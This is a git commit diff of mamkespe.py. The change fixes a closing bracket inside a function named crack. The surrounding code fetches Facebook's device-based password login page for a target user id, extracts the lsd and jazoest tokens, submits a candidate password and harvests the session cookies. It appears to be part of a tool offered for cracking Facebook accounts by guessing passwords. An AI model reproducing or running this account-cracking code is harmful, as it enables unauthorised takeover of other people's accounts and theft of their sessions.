7ff0bd613b773be396686f48aad264a7e3fbf5c6
rawagaming <161049728+rawagaming@users.noreply.github.com>
2024-04-03 22:52:21 -0700

    Update mamkespe.py

--- mamkespe.py
+++ mamkespe.py
@@ -315,7 +315,7 @@ def crack(idf,pwv):
     'upgrade-insecure-requests': '1',
     'user-agent': ua,
     'viewport-width': '980',
-}
+})
 			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
